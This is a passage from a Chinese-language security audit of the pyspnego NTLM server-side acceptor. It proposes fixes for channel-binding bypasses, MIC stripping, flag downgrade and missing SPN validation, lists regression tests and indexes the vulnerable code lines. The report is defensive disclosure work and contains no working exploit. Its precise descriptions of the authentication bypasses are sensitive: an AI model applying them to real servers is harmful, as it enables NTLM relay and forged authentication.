### R5【必须】CBT 检查必须覆盖所有认证分支，并在凭据校验之后

位置：`:567-611`。

- 把 CBT 校验移出 `if ... > 24:` 分支，作为"认证成功后、完成上下文前"的统一策略检查；NTLMv1/仅 LM 路径在 `require_cbt=True` 下应直接拒绝（因为它们根本没有地方携带 AV 对）；
- 把 CBT/MIC/SPN 失败与凭据失败**统一为同一个对外错误**（或在带外审计日志中区分），避免 3.4 的指纹。

### R6【必须】协商属性取"客户端请求 ∩ 服务端要求"，而不是客户端单方面声明

位置：`:624-627`、`:639`。

```python
required = self.context_req & (ContextReq.integrity | ContextReq.confidentiality | ...)
if required and not (auth.flags & ...):
    raise InvalidTokenError(context_msg="Peer did not honor required context attributes")
self._context_attr = auth.flags & self._context_req
```

理由：`:639` 现在让 AUTHENTICATE 里的 flags 直接决定会话的完整性与加密。清掉 SIGN/SEAL 后 `sign()` 进入 `always_sign` 常量分支（`security.py:67-72`），`verify()` 用同一常量比较而通过 —— 完整性名存实亡。

### R7【应做】SPN / MsvAvTargetName 校验（纵深防御）

位置：`_step_accept_authenticate`，在 `:573` 之后。

建议 API：

```python
spnego.server(..., expected_spn="HTTP/target")          # 或 expected_spn=["HTTP/target", "HTTP/target.corp"]
```

校验规则：

- 若 `require_spn=True`：`MsvAvTargetName` 必须存在且与 `expected_spn` 之一按文档规则（大小写不敏感、`/` 分隔）匹配；
- 若 `AvFlags.untrusted_spn` 被置位，按 MS-NLMP 语义视为"名字来源不可信"，在严格模式下拒绝；
- 不要把 `self.spn`（由 `hostname`/`service` 拼装、默认 `host/unspecified`）当作默认期望值 —— 默认值必须显式给出，否则等于没检查；
- 在文档中明确：SPN 校验不阻止同 SPN 的中继（见 4.2）。

### R8【应做】逐次绑定与派生上下文

- `NTLMProxy._step_accept`（`:478-492`）：在 `_step_accept_negotiate` 中保存本次传入的 `channel_bindings`（例如 `self._pending_channel_bindings`），供后续 Authenticate 步骤使用；若同一次会话中两次传入不一致，直接报错。
- `NTLMProxy.new_context()`（`:355-373`）、`NegotiateProxy.new_context()`（`_negotiate.py:132-140`）：复制"最近一次生效的绑定"，而不仅是 ctor 绑定。
- `CredSSPProxy.step()`（`_credssp.py:356-370`）：要么真正使用传入的 `channel_bindings`（传给内层上下文），要么在文档和类型上标注"CredSSP 忽略该参数，使用 TLS 公钥绑定"；当前"接受但忽略"最危险。
- SPNEGO 接收端：`_rebuild_context_list`（`_negotiate.py:452-505`）已能把逐次绑定传入子上下文（实测有效），但需在切换机制（`use_negotiate` → SSPI/GSSAPI）时保持语义一致，避免"同一 API 在不同 provider 下 CBT 行为不同"。

### R9【建议】解析与比较加固

- `TargetInfo.unpack`（`messages.py:956-989`）：对重复 AV 对显式拒绝（至少对安全敏感 ID：`channel_bindings`、`flags`、`timestamp`、`target_name`），避免"后者覆盖"造成解析/校验分歧；
- 未知/超长 AV 对不应被静默接受为 `bytes` 后写入有序字典（当前行为），应校验长度上限；
- 所有安全比较使用 `hmac.compare_digest`（`:587`、`:616`、`:619`、`:636`、`:875`）；
- 记录并在严格模式下强制 NTLMv2 时间戳与本地时间的偏差窗口（例如 ±5 分钟）。

### R10【建议】默认安全与可观测性

- `LM_COMPAT_LEVEL` 默认值从 `3` 提升到 `5`（或新增 `PYSPNEGO_STRICT_NTLM`），并在启动时记录当前有效值；
- 接收端在 `client_principal` 之外暴露 `auth_details`（是否使用 v1/LM、是否带 CBT、CBT 是否匹配、是否有 MIC、客户端声明的 target name），供上层做风险决策与审计；
- 若上层无法启用 CBT，文档应建议：NTLM 仅用于兼容路径，真正的信任边界使用 Kerberos 或 CBT/EPA。

---

## 9. 回归测试建议（与 R1-R9 一一对应）

新增 `tests/test_ntlm_trust.py`，全部基于本仓库的本地客户端/服务端或手工报文：

| 用例 | 断言 | 对应 |
|---|---|---|
| `test_accept_rejects_lm_only_response` | `LM=<8>||Z(16)`, 无 NT → `InvalidTokenError` | R1 |
| `test_accept_rejects_zero_lm_anonymous` | `LM=Z(24)` → `OperationNotAvailableError` | R1 |
| `test_accept_requires_mic_when_challenge_has_timestamp` | 删除 MIC 字段 → `InvalidTokenError` | R2 |
| `test_accept_rejects_stripped_timestamp_without_mic` | 改写 CHALLENGE 删 timestamp → 客户端无 MIC → 拒绝 | R2/R3 |
| `test_accept_rejects_zero_cbt` | 客户端发 Z(16)、服务端要求非零 CBT → `BadBindingsError` | R4 |
| `test_accept_rejects_missing_cbt_when_required` | `require_cbt=True` + 无 AV 对 → 拒绝 | R4 |
| `test_accept_cbt_enforced_on_v1` | `LM_COMPAT_LEVEL=0` + 不匹配 CBT → 拒绝 | R5 |
| `test_accept_rejects_flag_downgrade` | AUTHENTICATE 清 SIGN/SEAL 而服务端要求 integrity → 拒绝 | R6 |
| `test_accept_spn_mismatch` | `expected_spn="HTTP/target"`，客户端 target_name 不同 → 拒绝 | R7 |
| `test_accept_spn_untrusted_flag` | `AvFlags.untrusted_spn` → 严格模式拒绝 | R7 |
| `test_step_level_cbt_used_by_accept` | 只在第一步传 CBT，客户端不发 → 拒绝 | R8 |
| `test_new_context_inherits_effective_cbt` | 逐次绑定后 `new_context().channel_bindings` 非空 | R8 |
| `test_duplicate_av_pair_rejected` | 两个 `MsvAvChannelBindings` → 解析拒绝 | R9 |
| `test_constant_time_compare_used` | 代码层面检查（或对 `compare_digest` 打桩） | R9 |

同时扩展 `tests/test_ntlm.py::test_ntlm_bad_bindings` 的参数化维度（`client_opt` × `present` × `LM_COMPAT_LEVEL`），并新增 `protocol="negotiate"` 的等价用例（F1b/F3 已在 SPNEGO 下复现成功）。

---

## 10. 结论与残余风险

**当前实现的信任结论**是："报文里写出了凭据库里存在的用户名，并且（在 NTLMv2 且调用方要求时）回显了一个与本次 CHALLENGE 一致的哈希"。它**不包含**以下任何一项：

1. 证明客户端持有口令（6.1 表明在默认 `LM_COMPAT_LEVEL` 下不成立）；
2. 证明本次认证绑定在目标 TLS 通道上（CBT 可被 Z(16)、timestamp 抑制、分支跳过三重绕过）；
3. 证明本次认证是发给本服务实例的（SPN/target name 从不读取）；
4. 证明握手未被篡改（MIC 是否启用由可篡改的 CHALLENGE 决定，且字段可被删除）；
5. 证明会话具备完整性（协商属性由 AUTHENTICATE 决定，常量签名可通过校验）。

因此，**凡把纯 Python NTLM 接收端当作安全边界（跨信任域、跨服务、跨主机）的部署，都处于可被中继/伪造的状态**。持续有效的做法是：在 `LM_COMPAT_LEVEL>=4` 基础上叠加 R1-R6，并把 CBT/EPA 或 Kerberos 作为跨信任域的唯一认证方式；R7-R10 用于纵深防御与可观测性。

**残余风险（即使全部修复）**：

- 不使用 CBT 的 NTLM 仍可被中继 —— 这是协议属性，不是实现缺陷；
- SPN 校验无法区分同一 SPN 下的多个实例；
- 本报告的复现基于 Linux 上的纯 Python provider；Windows SSPI 路径由系统实现负责，但其策略（如 "Server SPN target name validation level"）需要单独审计；
- 本报告未与发布版 tarball 做逐行比对（5.1），合规场景请在取得发布包后复核 `_ntlm.py` 的接收端分支。

---

## 附录 A：关键代码位置索引

| 主题 | 位置 |
|---|---|
| 接收端 AUTHENTICATE 判定 | `src/spnego/_ntlm.py:548-641` |
| 匿名检查（1 字节比较） | `src/spnego/_ntlm.py:556-559` |
| NTLMv2 分支与 CBT 校验 | `src/spnego/_ntlm.py:567-591` |
| CBT Z(16) 通配符 | `src/spnego/_ntlm.py:587` |
| MIC 由客户端声明决定 | `src/spnego/_ntlm.py:590-591`、`632-637` |
| NTLMv1/LM 分支（无 CBT） | `src/spnego/_ntlm.py:593-611` |
| 凭据比对（LM 回退） | `src/spnego/_ntlm.py:613-622` |
| 协商属性取自对端 | `src/spnego/_ntlm.py:624-627`、`639` |
| 接收端 CHALLENGE 身份 | `src/spnego/_ntlm.py:521-527` |
| 客户端写入 CBT / target_name | `src/spnego/_ntlm.py:948-951` |
| `LM_COMPAT_LEVEL` | `src/spnego/_ntlm.py:284-306` |
| 逐次绑定丢弃 | `src/spnego/_ntlm.py:478-492` |
| `new_context()` 不继承逐次绑定 | `src/spnego/_ntlm.py:355-373`、`src/spnego/_negotiate.py:132-140` |
| ESS 下 LM 响应构造 | `src/spnego/_ntlm_raw/crypto.py:132-140` |
| `sign()` 常量分支 | `src/spnego/_ntlm_raw/security.py:67-72` |
| `unwrap()`/`verify()` | `src/spnego/_ntlm.py:746-754`、`863-878` |
| CBT 数据模型 | `src/spnego/channel_bindings.py:71-128` |
| AV 对解析（重复覆盖） | `src/spnego/_ntlm_raw/messages.py:956-989` |
| SPN 生成 | `src/spnego/_context.py:284-288` |
| Provider 选择 | `src/spnego/auth.py:20-95` |
| SPNEGO 绑定传递 | `src/spnego/_negotiate.py:296-300`、`452-505` |
| CredSSP 忽略 CBT | `src/spnego/_credssp.py:356-370`、`476-478` |
| 现有 CBT 测试 | `tests/test_ntlm.py:453-496` |
| 真实客户端 Z(16) 抓包 | `docs/scenarios/sspi_ntlm.md:205-206`、`docs/scenarios/gssapi_ntlm.md:192-193` 等 |

## 附录 B：复现脚本

仓库根目录 `security-125-repro.py`。运行：

```bash
PYTHONPATH=src python3 security-125-repro.py
```

脚本会打印 F1-F10 每一块的输入形态、接收端结论与拒绝原因，最后输出空 `GssChannelBindings` 的常量哈希。所有断言均为"观察到的实际行为"，可在修复后作为回归基线（修复后预期输出应整体翻转为 `rejected`，F10 应提示空绑定无效）。
